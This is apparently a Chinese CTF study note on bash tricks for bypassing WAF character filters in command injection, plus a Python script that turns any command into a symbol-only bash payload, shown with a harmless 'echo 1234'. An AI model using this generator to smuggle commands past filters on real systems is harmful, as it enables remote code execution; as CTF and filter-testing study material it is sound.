tags:: RCE, CTF/Shell/WAF绕过

- # bash特性
	- bash可以通过`$((进制#数值))`的方式转换进制，比如说`$((2#100))`表示4
	- bash可以使用移位操作`1<<1`产生数字2
	- bash中可以通过`$0<<<"echo 1"`来执行命令
		- 可以使用`$0<<<$0\<\<\<"echo 1"`让bash二次解析，避免将整个字符串识别成命令名。
	- bash中可以使用八进制表示字符串，比如`$'\154\163'`
		- 也就是`$'`加上以`\`开头的八进制，结尾加上`'`
	- bash中`${!xxx}`可以将一个变量的值作为变量名
		- 比如如果`def=abc`且`abc=123`那`${!def}`等价于`${abc}`，其结果是123。
		-
		-
- # payload生成
	- ```python
	  def generate(n):
	      if n == 0:
	          return "$((${!#}))"
	      elif n == -1:
	          return "$((~{n0}))".format(n0=generate(0))
	      elif n == 1:
	          return "$((~$(($((~{n0}))$((~{n0}))))))".format(n0 = generate(0))
	      elif isinstance(n, int) and n < 0:
	          return "$(({}))".format("".join(generate(-1) for _ in range(-n)))
	      elif isinstance(n, int) and n > 0:
	          return "$((~{}))".format(generate(-n - 1))
	      else:
	          raise NotImplemented()
	  
	  def zero_str():
	      return "${!#}"
	  
	  def binary_str(s):
	      assert all(c in "01" for c in s)
	      return s.replace("1", generate(1)).replace("0", generate(0))
	  
	  def num(n: int):
	      return f"$(($(({generate(1)}<<{generate(1)}))#{binary_str(bin(n)[2:])}))"
	  
	  def string(s: str):
	      return "$\\'" + "".join(
	          ["\\\\" + num(int(oct(ord(c))[2:]))
	              for c in s]
	      ) + "\\'"
	  
	  def payload(cmd):
	      return "{zero}<<<{zero}\\<\\<\\<{cmd}".format(
	          zero = zero_str(),
	          cmd = string(cmd)
	      )
	  
	  print(payload("echo 1234"))
	  ```
-